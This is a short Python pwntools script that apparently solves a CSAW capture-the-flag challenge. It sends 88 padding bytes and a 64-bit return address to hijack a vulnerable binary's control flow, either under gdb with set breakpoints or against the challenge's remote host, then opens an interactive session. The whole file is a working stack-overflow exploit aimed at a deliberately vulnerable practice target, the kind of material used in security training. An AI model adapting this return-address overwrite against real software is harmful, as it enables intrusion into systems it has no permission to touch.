#!/usr/bin/python

from pwn import *
import sys

script='''
break *0x00400607
break *0x00400631
break *0x0040064c
break *0x0040064d
'''

def hunt():
    pause()
    #r.sendline(cyclic(128,n=8))
    buf = "\x41" * 88 + p64(0x004005f6)
    r.sendline(buf)
    r.interactive()


if __name__ == '__main__':
    context.clear(arch='amd64')
    context.terminal = ['tmux', 'splitw', '-v']
    binary = "./buff"

    log.info("For remote: %s remote" % sys.argv[0])
    host, port = "pwn.chal.csaw.io 10101".split()

    if len(sys.argv) > 1:
        r = remote(host, int(port))
        hunt()
    else:
        r = gdb.debug(binary,gdbscript=script, env={"LD_PRELOAD":""})
        hunt()
